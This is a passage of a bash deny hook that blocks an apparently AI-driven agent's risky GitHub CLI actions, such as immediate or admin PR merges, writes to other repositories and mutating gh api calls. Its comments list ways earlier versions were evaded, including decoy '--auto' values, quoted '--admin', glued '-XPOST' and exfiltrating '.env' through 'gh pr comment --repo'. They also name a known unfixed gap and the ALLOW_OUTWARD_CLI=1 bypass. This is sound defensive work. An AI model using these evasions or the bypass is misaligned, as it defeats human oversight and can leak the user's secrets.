  deny "guard-outward-cli: more than one command-position 'gh pr merge' occurrence — ambiguous, cannot verify each carries --auto. Denying is the safe direction for a deny gate. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
elif [ "${GH_PR_MERGE_OCCURRENCES:-0}" -eq 1 ]; then
  # `--repo`/`-R` retargets the merge at an ARBITRARY repository — the --auto
  # carve-out is scoped to THIS repo's own sanctioned automerge pipeline, which
  # never passes it. Checked FIRST so it wins regardless of --auto.
  if gh_pr_clause_has_repo 'merge'; then
    deny "guard-outward-cli: 'gh pr merge' with --repo/-R targets a DIFFERENT GitHub repository with the user's PAT — outside the --auto carve-out, which exists only for this repo's own /todo automerge pipeline (it never passes --repo). Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
  CLAUSE=$(printf '%s' "$BARE" | grep -oiE "${_OUT_POS_PREFIX}gh[[:space:]]+pr[[:space:]]+merge${_OUT_POS_SUFFIX}[^;&|]*" | head -1)
  # A naive "--auto present" substring check is bypassable: several of `gh pr
  # merge`'s own flags (and the cross-subcommand --repo/-R every gh command
  # accepts) are VALUE-TAKING, so the token immediately after one of them is
  # consumed as its VALUE, not read as a separate flag — `gh pr merge 42
  # --body --auto` merges IMMEDIATELY, with "--auto" as the commit body text;
  # gh never sees a real --auto flag. Reuse the exact value-flag set
  # lib/cmd-detect.sh's own cmd_gh_pr_ref already established for this
  # subcommand family (derived against `gh pr merge|close|edit --help`,
  # deliberately kept as the FULL merge|close|edit union rather than a
  # merge-only subset — over-inclusion here only tightens the check, it
  # cannot create a bypass) and reject an --auto match whose PRECEDING
  # token is one of them.
  GH_MERGE_VALUE_FLAGS='^(--author-email|--body-file|--body|--match-head-commit|--subject|--comment|--add-assignee|--add-label|--add-project|--add-reviewer|--base|--milestone|--remove-assignee|--remove-label|--remove-project|--remove-reviewer|--title|--repo|-A|-b|-F|-t|-c|-B|-R)$'
  HAS_REAL_AUTO=$(awk -v flags="$GH_MERGE_VALUE_FLAGS" '
    { prev = ""
      for (i = 1; i <= NF; i++) {
        if ($i == "--auto" && prev !~ flags) { print "yes"; exit }
        prev = $i
      }
    }' <<< "$CLAUSE")
  if [ "$HAS_REAL_AUTO" != "yes" ]; then
    deny "guard-outward-cli: command-position 'gh pr merge' without a REAL --auto flag merges a PR immediately. A '--auto' token consumed as the VALUE of a preceding value-taking flag (--body/-b, --body-file/-F, --subject/-t, --author-email/-A, --match-head-commit/-c, --repo/-R, ...) does not count as --auto. 'gh pr merge --auto ...' (this repo's sanctioned /todo automerge mechanism) stays allowed — branch protection still gates the actual merge. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
  # --admin ("use administrator privileges to merge a PR that does not meet
  # requirements") contradicts the --auto carve-out's own premise (that branch
  # protection still gates the merge) — deny regardless of --auto. A
  # false-positive deny here (--admin appearing only as some OTHER flag's
  # value, or mentioned in an unrelated clause) is the safe direction, so no
  # value-flag predecessor check or clause-scoping is needed the way --auto's
  # decoy check above needs one: this check can only ever ADD a deny, never
  # grant a carve-out. DELIBERATELY scans the RAW $CMD (not $BARE/$CLAUSE):
  # `--admin` is a genuine, functioning argv token whether or not the shell
  # quoted it (quotes affect word-splitting, not what gh actually receives —
  # `gh pr merge 42 --auto "--admin"` passes the literal string `--admin`,
  # identically to the unquoted form), so relying on cmd_bare here — which
  # deliberately blanks quoted CONTENT to avoid false-positiving on a quoted
  # MENTION elsewhere in this hook — would make a quoted --admin invisible
  # and silently grant the very carve-out this check exists to deny (found in
  # review round 2: `gh pr merge 42 --auto "--admin"` and
  # `gh pr merge 42 --auto --admin=true` both slipped past a $CLAUSE-based
  # whitespace-only check). The boundary class is "not a word/dash character"
  # rather than strictly whitespace, so it also catches `--admin=true`,
  # `--admin=1`, and a trailing quote/comma/etc.
  if grep -Eq '(^|[^-A-Za-z0-9])--admin([^-A-Za-z0-9]|$)' <<< "$CMD"; then
    deny "guard-outward-cli: command-position 'gh pr merge --admin' uses administrator privileges to merge a PR that may not meet requirements — this contradicts the --auto carve-out's premise (branch protection gating). Denying regardless of --auto. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
fi

# --- gh: other mutating subcommands (pr create/comment allowed only without
#     --repo/-R, see the header) -------------------------------------------
GH_MUTATING_RE="${_OUT_POS_PREFIX}gh[[:space:]]+(pr[[:space:]]+(close|edit|ready|reopen|review|lock|unlock|update-branch|revert)|release[[:space:]]+(create|delete|delete-asset|edit|upload)|repo[[:space:]]+(create|delete|archive|unarchive|edit|rename|sync|fork))${_OUT_POS_SUFFIX}"
if grep -Eqi "$GH_MUTATING_RE" <<< "$BARE"; then
  deny "guard-outward-cli: command-position mutating 'gh pr/release/repo' subcommand. Read-only forms (gh pr view/checks/list, gh release view/list, gh repo view/list, ...) are unaffected; gh pr create/comment are deliberately allowed (routine PR workflow) unless retargeted with --repo/-R. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi

# --- gh pr create/comment: routine carve-out, but NOT at another repo --------
# `--repo`/`-R` turns the routine carve-out into unbounded egress to an
# arbitrary GitHub repository with the user's PAT (`gh pr comment --repo
# other/org --body "$(cat .env)"` was ALLOWED, review round 3). Same treatment
# lib/cmd-detect.sh:242 already gives the flag, and this repo's own PR flow
# never passes it. Clause-scoped raw-$CMD flag scan — see gh_pr_clause_has_repo.
if grep -Eqi "${_OUT_POS_PREFIX}gh[[:space:]]+pr[[:space:]]+(create|comment)${_OUT_POS_SUFFIX}" <<< "$BARE" \
   && gh_pr_clause_has_repo 'create|comment'; then
  deny "guard-outward-cli: 'gh pr create/comment' with --repo/-R writes to a DIFFERENT GitHub repository with the user's PAT — unbounded egress, outside the routine-workflow carve-out these two subcommands get. Without --repo/-R they stay allowed. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi

# --- gh api: mutating HTTP method -------------------------------------------
# `gh api` can invoke an ARBITRARY GitHub REST mutation, including the exact
# PR-merge action the dedicated clause above gates, via a different
# subcommand (`gh api -X PUT repos/.../pulls/42/merge`). Key the deny on the
# HTTP method, not the subcommand: this repo has legitimate READ-ONLY `gh
# api` usage (scripts/todo-automerge-guard.sh, .claude/skills/land/SKILL.md —
# both GET, gh api's own default with no -X/--method), which a blanket `gh
# api` deny would break.
# NOTE: operating on $BARE (not raw $CMD) means a QUOTED method value (`gh
# api -X "POST" ...`) is invisible here — cmd_bare blanks quoted CONTENT
# (that's what stops a quoted MENTION from false-positive-denying elsewhere
# in this hook), so there is nothing left to match once the value is quoted.
# Documented residual, same accepted-gap shape as the others in the header.
# More than one command-position `gh api` occurrence is ambiguous — the
# ORIGINAL round-2 version used `head -1` and silently ignored every
# occurrence after the first, which let a read-only first call shadow a
# mutating second one (`gh api repos/x/y && gh api -X PUT .../merge` was
# ALLOWED). Deny on >1, mirroring the identical multi-occurrence safe
# direction the `gh pr merge` check above already takes.
GH_API_RE="${_OUT_POS_PREFIX}gh[[:space:]]+api${_OUT_POS_SUFFIX}"
GH_API_OCCURRENCES=$(printf '%s' "$BARE" | grep -oiE "$GH_API_RE" | wc -l | tr -d '[:space:]')
if [ "${GH_API_OCCURRENCES:-0}" -gt 1 ]; then
  deny "guard-outward-cli: more than one command-position 'gh api' occurrence — ambiguous, cannot verify each is read-only. Denying is the safe direction for a deny gate. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
elif [ "${GH_API_OCCURRENCES:-0}" -eq 1 ]; then
  GH_API_CLAUSE=$(printf '%s' "$BARE" | grep -oiE "${_OUT_POS_PREFIX}gh[[:space:]]+api[[:space:]][^;&|]*" | head -1)
  # Matches BOTH the spaced/`=` form (-X POST, -X=POST, --method POST,
  # --method=POST) AND the glued short-flag form (-XPOST — the common
  # curl-style spelling; found bypassing a separator-only pattern in review
  # round 2), case-insensitively.
  if [ -n "$GH_API_CLAUSE" ] && grep -Eqi '(^|[[:space:]])(-X(post|put|patch|delete)([[:space:]]|$)|(-X|--method)([[:space:]]+|=)(post|put|patch|delete)([[:space:]]|$))' <<< "$GH_API_CLAUSE"; then
    deny "guard-outward-cli: command-position 'gh api' with a mutating HTTP method (-X/--method POST/PUT/PATCH/DELETE, spaced/=/glued) can invoke an arbitrary GitHub REST mutation — including a PR merge via a different subcommand than the dedicated 'gh pr merge' check above. Read-only 'gh api' (GET, the default with no -X/--method) is unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
fi

exit 0
